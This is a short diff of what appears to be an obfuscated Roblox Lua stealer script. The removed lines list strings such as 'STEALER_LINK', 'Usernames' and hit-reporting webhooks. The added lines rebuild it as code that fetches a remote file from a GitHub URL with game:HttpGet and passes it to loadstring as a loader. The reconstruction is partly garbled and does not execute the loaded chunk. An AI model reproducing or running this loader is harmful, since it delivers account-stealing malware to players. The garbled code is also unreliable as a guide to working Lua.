@@ -1,24 +1,17 @@
 ```lua
-type
-string
-sub
-table
-foreach
-string
-char
-string
-byte
-tostring
-print
-MoonSec_StringsHiddenAttr
-This file was protected with MoonSec V3
-STEALER_LINK
-FrostDragonRobloxxx
-Usernames
-BigHitsWebhook
-SmallHitsWebhook
-loadstring
-game
-HttpGet
-STEALER_LINK
+type = "string"
+sub = string.sub
+foreach = table.foreach
+char = string.char
+byte = string.byte
+
+local function fIWWHZSgczJ_eTy()
+    print("MoonSec_StringsHiddenAttr")
+end
+
+tostring(fIWWHZSgczJ_eTy)
+
+print("This file was protected with MoonSec V3")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/websocket/refs/heads/main/main.js"))
 ```
